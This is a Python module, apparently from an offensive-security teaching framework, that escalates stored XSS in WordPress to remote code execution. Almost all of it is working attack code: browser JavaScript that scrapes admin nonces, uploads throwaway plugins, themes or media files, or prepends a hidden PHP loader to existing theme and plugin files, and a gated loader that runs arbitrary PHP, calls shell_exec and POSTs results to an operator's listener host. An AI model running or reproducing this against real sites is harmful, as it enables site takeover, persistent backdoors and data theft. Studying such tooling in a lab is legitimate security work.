"""
HWP Core — XSS-to-RCE Adapter.

This is a FRAMEWORK CORE component, not a sample exploit. It is enabled by
the operator (CLI `--xss-rce-adapter`, or the TUI checkbox) whenever a stored
XSS exploit is selected and the operator wants to escalate it to RCE.

The communication problem it solves:
    alert(1) proves XSS to a researcher but means nothing to a webmaster or a
    developer doing triage. Code running on the server — echo "hello", a file
    written, a command executed — is unambiguous.

How it fits the chain (resolved right-to-left by the framework):
    payload(RCE) → [adapter, delivers="XSS"] → exploit(XSS, stored)

    - The payload is UNCHANGED and OWNS its PHP completely. It emits whatever
      the student wrote — filename, target path, file-writing logic, anything.
      It does not know an adapter exists. To the adapter the instruction is
      just opaque PHP: it might be a webshell dropper, it might be echo "hi".
    - The adapter receives that PHP as its `instruction`. It owns ONLY XSS and
      beacon/transport knowledge: it prepends a server-side call-home block,
      then wraps the whole thing in admin-context JS that gets it onto the
      server and triggers it. It NEVER picks a filename or a path for the
      payload, and it NEVER rewrites the payload's PHP.
    - The XSS exploit takes the JS, stores it, and returns immediately.

What the adapter delivers (the "loader") is one PHP block:

    <?php if (isset($_REQUEST['hwp-beacon'])) {
        <call-home machinery>
        ob_start();
        <PAYLOAD PHP, verbatim>           // whatever the student wrote
        <emit JSON to browser + POST it to the framework listener>
        die();
    } ?>
    <original file content>               // edit sinks only (see below)

The gate means the block does NOTHING on a normal request, so when an edit
sink prepends it to an existing file, that file keeps its normal behaviour —
the injected logic only fires on ?hwp-beacon=1. The block goes FIRST (and
die()s inside the gate) for two reasons:
    1. the original file might die() early (e.g. `defined('ABSPATH')||die;`),
       which would stop our code from ever running if we appended below it;
    2. the original might emit output we don't want polluting the clean JSON
       beacon response — gating + die() short-circuits it on a beacon hit.

The payload's own echo is captured (ob_start/ob_get_clean) and returned in the
JSON `output` field, so a dropper that prints where it wrote the shell reports
that back through the adapter without the adapter having to understand it.

Sinks (tried in reliability order at browser-fire time, each gated on admin
capability AND verified reachable before being treated as success):
    1. plugin-upload  — install a throwaway .zip plugin carrying the loader
    2. theme-upload   — install a throwaway .zip theme carrying the loader
    3. media-upload   — upload the loader .php to wp-content/uploads/ via
                        async-upload.php (requires `unfiltered_upload`; granted
                        in the Docker lab, and the only sink that works when
                        everything except uploads/ is read-only)
    4. theme-editor   — PREPEND the gated loader atop an existing theme file
    5. plugin-editor  — PREPEND the gated loader atop an existing plugin file

The editor sinks APPEND, never replace: the JS fetches the file's current
content from the editor textarea and writes `loader + original` back, so the
host file is preserved and only gains the dormant, gated block on top.

A write that lands is NOT a success on its own. Some files can't be reached
afterwards (e.g. wp-content/plugins/akismet/.htaccess denies direct access to
akismet.php), so each sink VERIFIES the written file is reachable with
?hwp-beacon=1 and only stops on a file that both writes AND fires. Otherwise
it falls through to the next file / next sink.

Beacon (operator chooses, mirrors the revshell --lhost/--lport convention):
    no  --lhost  → no call-home. The JS still delivers + triggers the loader;
                   the browser still gets the JSON outcome (visible with
                   --adapter-debug), so the operator can confirm execution.
    yes --lhost  → the loader's call-home block (a server-side PHP
                   file_get_contents POST to lhost:lport) reports back when the
                   PHP EXECUTES ON THE SERVER, proving RCE — not just that JS
                   ran in the browser. It is PHP, not JS, on purpose: a
                   server-side request has no CORS/same-origin restriction
                   reaching the operator's listener. The framework listens and
                   reports the hit.

The framework (chain.py) owns the listener lifecycle and all XSS-specific
operator messaging, so the unchanged payload's report() never has to know
this happened.
"""

DELIVERS = "XSS"
ACCEPTS = "RCE"

# The adapter creates throwaway plugins/themes and uploads files as DELIVERY
# VEHICLES. Those vehicle files need a name — that is the adapter's own
# artifact, NOT the payload's output, and is intentionally fixed and not
# operator-configurable. (The payload names whatever IT writes, inside its
# own PHP. The adapter never touches that.)
LOADER_NAME = "hwp-loader.php"


def normalize_php(instruction):
    """Strip whatever tag form the payload used down to the raw PHP body.

    This is so the payload's code can be inlined INSIDE the gate and executed
    in place. It is not a rewrite — the body runs verbatim; we only remove the
    outer <?php ?> wrapper so it can live inside our own.
    """
    php = instruction or ""
    php = php.strip()
    if php.startswith("<?php"):
        php = php[5:]
    elif php.startswith("<?"):
        php = php[2:]
    if php.endswith("?>"):
        php = php[:-2]
    return php.strip()


def _php_str(s):
    """Encode a Python string as a single-quoted PHP string literal."""
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


def build_loader(instruction, lhost, lport):
    """Build the gated PHP loader: call-home block + the payload's PHP verbatim.

    The result starts with <?php, gates on ?hwp-beacon=1, and closes with ?>.
    On a normal request it emits nothing. On a beacon request it captures the
    payload's output, runs the payload, reports back, and die()s before any
    appended original content can run.
    """
    body = normalize_php(instruction)
    beacon_url = f"http://{lhost}:{lport}/" if lhost else ""

    php = (
        "<?php\n"
        "// hwp xss->rce adapter loader — dormant unless ?hwp-beacon=1\n"
        "if(isset($_REQUEST['hwp-beacon'])){\n"
        # --- call-home / report helper (runs once, even if the payload die()s) ---
        "function hwp_finish($beacon){\n"
        "static $done=false; if($done){return;} $done=true;\n"
        "$out=@ob_get_clean();\n"                       # the payload's own echo
        "$res=array("
        "'hwp'=>true,"                                  # JS checks this for success
        "'loader'=>__FILE__,"                           # where the vehicle landed
        "'output'=>$out,"                               # payload's report, verbatim
        "'user'=>@trim(@shell_exec('whoami')));\n"
        "$json=@json_encode($res);\n"
        # 1) answer the browser first (synchronous, reliable). The JS reads this
        #    to confirm success + reachability even if the call-home later fails.
        "@header('Content-Type: application/json');\n"
        "echo $json;\n"
        "if(function_exists('fastcgi_finish_request')){@fastcgi_finish_request();}"
        "else{@flush();}\n"
        # 2) best-effort server-side call-home (PHP, so no CORS). Non-fatal.
        "if($beacon){@file_get_contents($beacon,false,"
        "stream_context_create(array('http'=>array("
        "'method'=>'POST','header'=>'Content-Type: application/json',"
        "'content'=>$json,'timeout'=>5))));}\n"
        "}\n"
        "$hwp_beacon=" + _php_str(beacon_url) + ";\n"
        # Register BEFORE running the payload so a payload exit()/die() or fatal
        # still reports back via the shutdown handler.
        "register_shutdown_function('hwp_finish',$hwp_beacon);\n"
        "ob_start();\n"
        "// ===== payload instruction (verbatim — adapter does not touch it) =====\n"
        + body + "\n"
        "// ===== end payload instruction =====\n"
        "hwp_finish($hwp_beacon);\n"
        "die();\n"
        "}\n"
        "?>"
    )
    return php


def build_js(php_b64, debug=False):
    """Admin-context JavaScript executed in the victim admin's browser.

    Scrapes the relevant nonce from each admin page, then delivers the
    base64-decoded loader PHP via the first sink the admin has access to. Sink
    choice happens here, at fire time. After a write it requests the file with
    ?hwp-beacon=1 both to TRIGGER server-side execution (firing the call-home)
    and to VERIFY reachability — a write that can't be reached is not a success.

    The loader is carried base64-encoded so the student's PHP is never mangled
    by quoting as it travels JS → stored XSS → editor/upload POST.

    Edit sinks PREPEND the loader to a file's existing content (fetched from the
    editor textarea), never replace it.

    When debug is on, each step is logged to the browser console (no network
    telemetry — a separate channel would collide with the beacon listener).

    Kept as one self-contained IIFE so it drops cleanly into any stored-XSS
    sink with no external dependencies.
    """
    dbg_setup = "var DBG=" + ("true" if debug else "false") + ";"
    return (
        "(function(){"
        "var P=atob('" + php_b64 + "');"          # the gated loader block
        "var LOADER='" + LOADER_NAME + "';"        # adapter vehicle filename
        "var O=location.origin;"
        + dbg_setup +
        # ---- debug telemetry: log to the browser console ----
        "function D(step,detail){if(!DBG)return;"
        "console.log('%c[hwp-adapter]%c '+step+': %c'+detail,"
        "'color:#0cf;font-weight:bold','color:#888','color:#fff');}"
        "D('boot','adapter JS started; origin='+O+' loader_len='+P.length);"
        # ---- tiny XHR helpers ----
        "function g(u,cb){var x=new XMLHttpRequest();x.open('GET',u,true);"
        "x.withCredentials=true;x.onreadystatechange=function(){"
        "if(x.readyState==4){D('GET',u+' -> '+x.status);"
        "cb(x.status==200?x.responseText:null,x.status);}};x.send();}"
        "function p(u,b,ct,cb){var x=new XMLHttpRequest();x.open('POST',u,true);"
        "x.withCredentials=true;if(ct)x.setRequestHeader('Content-Type',ct);"
        "x.onreadystatechange=function(){if(x.readyState==4){"
        "D('POST',u+' -> '+x.status);cb(x.status,x.responseText);}};"
        "x.send(b);}"
        "function enc(s){return encodeURIComponent(s);}"
        "function nonce(h,n){if(!h)return null;"
        "var m=h.match(new RegExp('name=.'+n+'.\\\\s+value=.([a-zA-Z0-9]+).'));"
        "return m?m[1]:null;}"
        # ---- decode a file's current content out of the editor textarea ----
        # The theme/plugin editor renders the file in <textarea name=newcontent>,
        # HTML-entity-encoded. We pull it out and decode it so we can PREPEND our
        # loader and write loader+original back (append, not replace).
        "function htmldec(s){var t=document.createElement('textarea');"
        "t.innerHTML=s;return t.value;}"
        "function getOrig(h){if(!h)return '';"
        "var m=h.match(/<textarea[^>]*\\bname=[\"']?newcontent[\"']?[^>]*>([\\s\\S]*?)<\\/textarea>/i);"
        "return m?htmldec(m[1]):'';}"
        # combine loader + original; P ends with ?> so ?>\n<?php collapses cleanly
        "function combine(orig){return orig?(P+'\\n'+orig):P;}"
        # ---- build a minimal single-file plugin/theme zip in-browser ----
        # Stored-uncompressed zip so we need no deflate; CRC32 computed in JS.
        "function crc32(s){var c,t=[];for(var n=0;n<256;n++){c=n;"
        "for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c;}"
        "var x=0xFFFFFFFF;for(var i=0;i<s.length;i++)"
        "x=(x>>>8)^t[(x^s.charCodeAt(i))&0xFF];return(x^0xFFFFFFFF)>>>0;}"
        "function u16(n){return String.fromCharCode(n&255,(n>>8)&255);}"
        "function u32(n){return String.fromCharCode(n&255,(n>>8)&255,(n>>16)&255,(n>>24)&255);}"
        "function blob(bin){var a=new Uint8Array(bin.length);"
        "for(var i=0;i<bin.length;i++)a[i]=bin.charCodeAt(i)&255;"
        "return new Blob([a],{type:'application/octet-stream'});}"
        # multi-file stored zip
        "function zipMulti(files){var lf='',cd='',o=0;"
        "for(var i=0;i<files.length;i++){var fn=files[i][0],dt=files[i][1];"
        "var crc=crc32(dt),sz=dt.length;"
        "lf+='PK\\x03\\x04'+u16(20)+u16(0)+u16(0)+u16(0)+u16(0)"
        "+u32(crc)+u32(sz)+u32(sz)+u16(fn.length)+u16(0)+fn+dt;}"
        "for(var j=0;j<files.length;j++){var fn=files[j][0],dt=files[j][1];"
        "var crc=crc32(dt),sz=dt.length;"
        "cd+='PK\\x01\\x02'+u16(20)+u16(20)+u16(0)+u16(0)+u16(0)+u16(0)"
        "+u32(crc)+u32(sz)+u32(sz)+u16(fn.length)+u16(0)+u16(0)+u16(0)+u16(0)"
        "+u32(0)+u32(o)+fn;o+=4+26+fn.length+sz;}"
        "var eo='PK\\x05\\x06'+u16(0)+u16(0)+u16(files.length)+u16(files.length)"
        "+u32(cd.length)+u32(lf.length)+u16(0);return lf+cd+eo;}"
        # ---- multipart upload helper ----
        "function upload(u,field,fname,blb,extra,cb){"
        "var fd=new FormData();fd.append(field,blb,fname);"
        "for(var k in extra)fd.append(k,extra[k]);"
        "var x=new XMLHttpRequest();x.open('POST',u,true);x.withCredentials=true;"
        "x.onreadystatechange=function(){if(x.readyState==4){"
        "D('UPLOAD',u+' -> '+x.status+' body='+(x.responseText||'').substr(0,180));"
        "cb(x.status,x.responseText);}};x.send(fd);}"
        # ================= SINK: theme editor =================
        # Walk every theme; within each, try editable top-level .php files. For
        # each file we FETCH its current content, PREPEND the loader, write it
        # back, and VERIFY reachability. Stop at the first file that writes AND
        # is reachable (a deny rule just means "try the next one").
        # pickPhps: ordered TOP-LEVEL (no slash) .php candidates, preferred first.
        "function pickPhps(h,prefs){"
        "var re=/[?&]file=([^&\"'#]+\\.php)/g,m,all=[];"
        "while((m=re.exec(h)))all.push(decodeURIComponent(m[1]));"
        "var top=all.filter(function(f){return f.indexOf('/')<0;});"
        "var out=[];"
        "for(var pi=0;pi<prefs.length;pi++)"
        "for(var i=0;i<top.length;i++)"
        "if(top[i]===prefs[pi]&&out.indexOf(top[i])<0)out.push(top[i]);"
        "for(var j=0;j<top.length;j++)if(out.indexOf(top[j])<0)out.push(top[j]);"
        "return out;}"
        "function listThemes(h){"
        "var re=/<option[^>]*value=.([^\"'>]+).[^>]*>/g,m,out=[];"
        "while((m=re.exec(h))){var v=m[1];if(v&&out.indexOf(v)<0)out.push(v);}"
        "if(!out.length){var hm=h.match(/name=.theme.\\s+value=.([^\"']+)./);"
        "if(hm)out.push(hm[1]);}return out;}"
        "function s_themeEdit(next){D('sink-themeedit','enumerating themes');"
        "g(O+'/wp-admin/theme-editor.php',function(h,st){"
        "if(st!=200){D('sink-themeedit','editor not accessible status='+st);next();return;}"
        "var n=nonce(h,'nonce');if(!n){D('sink-themeedit','no nonce');next();return;}"
        "var themes=listThemes(h);"
        "D('sink-themeedit','themes='+(themes.join(',')||'NONE'));"
        "if(!themes.length){next();return;}"
        "var ti=0;"
        "function nextTheme(){"
        "if(ti>=themes.length){D('sink-themeedit','all themes exhausted');next();return;}"
        "var theme=themes[ti++];"
        "g(O+'/wp-admin/theme-editor.php?theme='+enc(theme),function(th,ts){"
        "var files=pickPhps(th,['404.php','index.php','functions.php']);"
        "D('sink-themeedit','theme='+theme+' files='+(files.join(',')||'NONE'));"
        "if(!files.length){nextTheme();return;}"
        "var fi=0;function nextFile(){"
        "if(fi>=files.length){nextTheme();return;}"
        "var tgt=files[fi++];"
        # fetch THIS file's current content + a fresh nonce, then prepend+write
        "g(O+'/wp-admin/theme-editor.php?theme='+enc(theme)+'&file='+enc(tgt),"
        "function(fh,fs){var tn=nonce(fh,'nonce')||n;var orig=getOrig(fh);"
        "var content=combine(orig);"
        "var b='nonce='+enc(tn)+'&_wp_http_referer='+enc('/wp-admin/theme-editor.php')"
        "+'&newcontent='+enc(content)+'&action=update'"
        "+'&file='+enc(tgt)+'&theme='+enc(theme)+'&docs-list=&scrollto=0';"
        "p(O+'/wp-admin/theme-editor.php',b,'application/x-www-form-urlencoded',"
        "function(s,rt){D('sink-themeedit','wrote '+theme+'/'+tgt+' POST='+s+'; verifying');"
        "fire('themes/'+theme+'/'+tgt,nextFile);});});}"
        "nextFile();});}"
        "nextTheme();});}"
        # ================= SINK: plugin editor =================
        # Walk every plugin; for each, list its editable .php files, FETCH each
        # file's content, PREPEND the loader, write back, verify reachability.
        "function listPlugins(h){"
        "var re=/<option[^>]*value=.([^\"'>]+\\.php).[^>]*>/g,m,out=[];"
        "while((m=re.exec(h))){var v=decodeURIComponent(m[1]);"
        "if(v&&out.indexOf(v)<0)out.push(v);}return out;}"
        "function s_pluginEdit(next){D('sink-pluginedit','enumerating plugins');"
        "g(O+'/wp-admin/plugin-editor.php',function(h,st){"
        "if(st!=200){D('sink-pluginedit','editor not accessible status='+st);next();return;}"
        "var n=nonce(h,'nonce');if(!n){D('sink-pluginedit','no nonce');next();return;}"
        "var plugins=listPlugins(h);"
        "D('sink-pluginedit','plugins='+(plugins.join(',')||'NONE'));"
        "if(!plugins.length){next();return;}"
        "var pi=0;function nextPlugin(){"
        "if(pi>=plugins.length){D('sink-pluginedit','all plugins exhausted');next();return;}"
        "var plug=plugins[pi++];"                       # 'slug/file.php' (plugin id)
        "g(O+'/wp-admin/plugin-editor.php?plugin='+enc(plug),function(ph,ps){"
        "var re=/[?&]file=([^&\"'#]+\\.php)/g,m,files=[];"
        "while((m=re.exec(ph))){var f=decodeURIComponent(m[1]);"
        "if(files.indexOf(f)<0)files.push(f);}"
        # prefer the plugin's main file (slug/slug.php), else any
        "files.sort(function(a,b){var sa=a.split('/'),sb=b.split('/');"
        "var ma=(sa.length===2&&sa[1]===sa[0]+'.php')?0:1;"
        "var mb=(sb.length===2&&sb[1]===sb[0]+'.php')?0:1;return ma-mb;});"
        "D('sink-pluginedit','plugin='+plug+' files='+(files.join(',')||'NONE'));"
        "if(!files.length){nextPlugin();return;}"
        "var fi=0;function nextFile(){"
        "if(fi>=files.length){nextPlugin();return;}"
        "var tgt=files[fi++];"
        # fetch this file's content + nonce, prepend loader, write back
        "g(O+'/wp-admin/plugin-editor.php?plugin='+enc(plug)+'&file='+enc(tgt),"
        "function(fh,fs){var pn=nonce(fh,'nonce')||n;var orig=getOrig(fh);"
        "var content=combine(orig);"
        "var b='nonce='+enc(pn)+'&_wp_http_referer='+enc('/wp-admin/plugin-editor.php')"
        "+'&newcontent='+enc(content)+'&action=update'"
        "+'&file='+enc(tgt)+'&plugin='+enc(plug)+'&scrollto=0';"
        "p(O+'/wp-admin/plugin-editor.php',b,'application/x-www-form-urlencoded',"
        "function(s,rt){D('sink-pluginedit','wrote '+tgt+' POST='+s+'; verifying');"
        "fire('plugins/'+tgt,nextFile);});});}"
        "nextFile();});}"
        "nextPlugin();});}"
        # ================= SINK: plugin upload =================
        "function s_pluginUpload(next){D('sink-pluginupload','fetching install page');"
        "g(O+'/wp-admin/plugin-install.php',function(h,st){"
        "var n=nonce(h,'_wpnonce');"
        "D('sink-pluginupload','nonce='+(n||'NONE')+' page_status='+st);"
        "if(!n){next();return;}"
        "var slug='hwp'+Math.floor(Math.random()*100000);"
        # plugin header + loader; vehicle file is slug/slug.php
        "var php='<?php /* Plugin Name: '+slug+' */ ?>\\n'+P;"
        "var z=blob(zipMulti([[slug+'/'+slug+'.php',php]]));"
        "D('sink-pluginupload','built zip slug='+slug+' bytes='+z.size);"
        "upload(O+'/wp-admin/update.php?action=upload-plugin',"
        "'pluginzip',slug+'.zip',z,{'_wpnonce':n,'install-plugin-submit':'Install Now'},"
        "function(s,t){if(s==200){D('sink-pluginupload','upload 200; verifying');"
        "fire('plugins/'+slug+'/'+slug+'.php',next);}"
        "else{D('sink-pluginupload','upload failed status='+s);next();}});});}"
        # ================= SINK: theme upload =================
        "function s_themeUpload(next){D('sink-themeupload','fetching install page');"
        "g(O+'/wp-admin/theme-install.php',function(h,st){"
        "var n=nonce(h,'_wpnonce');"
        "D('sink-themeupload','nonce='+(n||'NONE')+' page_status='+st);"
        "if(!n){next();return;}"
        "var slug='hwp'+Math.floor(Math.random()*100000);"
        "var css='/* Theme Name: '+slug+' */';"
        # theme header in style.css; loader in the vehicle file, hit directly
        "var z=blob(zipMulti([[slug+'/style.css',css],[slug+'/'+LOADER,P]]));"
        "D('sink-themeupload','built zip slug='+slug+' bytes='+z.size);"
        "upload(O+'/wp-admin/update.php?action=upload-theme',"
        "'themezip',slug+'.zip',z,{'_wpnonce':n,'install-theme-submit':'Install Now'},"
        "function(s,t){if(s==200){D('sink-themeupload','upload 200; verifying');"
        "fire('themes/'+slug+'/'+LOADER,next);}"
        "else{D('sink-themeupload','upload failed status='+s);next();}});});}"
        # ================= SINK: media upload (uploads/) =================
        "function s_media(next){D('sink-media','fetching media-new page');"
        "g(O+'/wp-admin/media-new.php',function(h,st){"
        "var n=nonce(h,'_wpnonce');"
        "D('sink-media','_wpnonce='+(n||'NONE')+' page_status='+st);"
        "var blb=blob(P);"
        "D('sink-media','uploading '+LOADER+' bytes='+blb.size);"
        "upload(O+'/wp-admin/async-upload.php','async-upload',LOADER,blb,"
        "{'_wpnonce':n||'','action':'upload-attachment','name':LOADER},"
        "function(s,t){"
        "if(s==200&&t&&t.indexOf('\"success\":true')>=0){"
        "D('sink-media','upload json success; verifying');"
        # pull the real URL from the JSON response and verify it directly
        "var um=t.match(/\"url\":\"([^\"]+)\"/);"
        "if(um){var u=um[1].replace(/\\\\\\//g,'/');D('sink-media','url='+u);"
        "fireAbs(u,next);}else{fire('uploads/'+LOADER,next);}}"
        "else{D('sink-media','upload failed status='+s+' body='+(t||'').substr(0,180));next();}});});}"
        # ---- VERIFICATION + TRIGGER: hit the written loader WITH the gate.
        # Success means the loader RETURNED {"hwp":true} — i.e. it ran AND
        # reported. Stronger than a bare 200: a file that's reachable but isn't
        # our loader (or didn't run) won't carry the flag, so we correctly try
        # the next target. The JSON also carries the payload's own output and
        # the loader's path, logged to the console so the operator sees the
        # result even if the async call-home never arrives. ----
        "function fire(rel,next){fireAbs(O+'/wp-content/'+rel,next);}"
        "function fireAbs(base,next){"
        "var u=base+(base.indexOf('?')<0?'?':'&')+'hwp-beacon=1';"
        "D('fire','triggering loader: '+u);"
        "g(u,function(t,st){"
        "if(st!=200){D('fire','loader NOT reachable (status='+st+') — next target');"
        "if(next)next();return;}"
        "var ok=false,info=null;"
        "try{info=JSON.parse(t);ok=info&&info.hwp===true;}catch(e){"
        "ok=(t&&t.indexOf('\"hwp\":true')>=0);}"
        "if(ok){"
        "var lo=info?(info.loader||''):'';"
        "var op=info?(info.output||''):'';"
        "D('fire','SUCCESS — loader executed on server'+(lo?' at '+lo:''));"
        "if(op)D('fire','payload output: '+op);"
        "if(info&&info.user)D('fire','running as: '+info.user);"
        # success: stop the chain (do NOT call next)
        "}else{"
        "D('fire','loader reachable but no hwp flag — next target');"
        "if(next)next();}});}"
        # ---- run sinks in reliability order ----
        # Uploads first: they create fresh, web-accessible files (most reliable).
        # Editors last: they touch existing files which may sit behind deny rules
        # (e.g. akismet 403s on direct .php access). Each sink VERIFIES before
        # claiming success, falling through on 403.
        "D('run','starting sink chain');"
        "s_pluginUpload(function(){s_themeUpload(function(){"
        "s_media(function(){s_themeEdit(function(){"
        "s_pluginEdit(function(){D('done','all sinks exhausted (none reachable)');});"
        "});});});});"
        "})();"
    )


def make_js(instruction, options):
    """Top-level: turn a payload's PHP instruction into XSS delivery JS.

    Returns the JS string for the framework to feed to the XSS exploit. The
    adapter takes NO naming input — what the loader does, where the payload
    writes, and what it's called are all the payload's concern.
    """
    lhost = options.get("lhost", "")
    lport = options.get("lport", "8888")

    loader_php = build_loader(instruction, lhost, lport)
    php_b64 = _b64(loader_php)

    # Debug just toggles console.log telemetry in the emitted JS. It does not
    # depend on a beacon/lhost — you can watch the sink chain in browser
    # devtools even with no beacon configured.
    debug_on = bool(options.get("adapter-debug") or options.get("adapter_debug"))

    return build_js(php_b64, debug=debug_on)


def _b64(s):
    import base64
    if isinstance(s, str):
        s = s.encode()
    return base64.b64encode(s).decode()
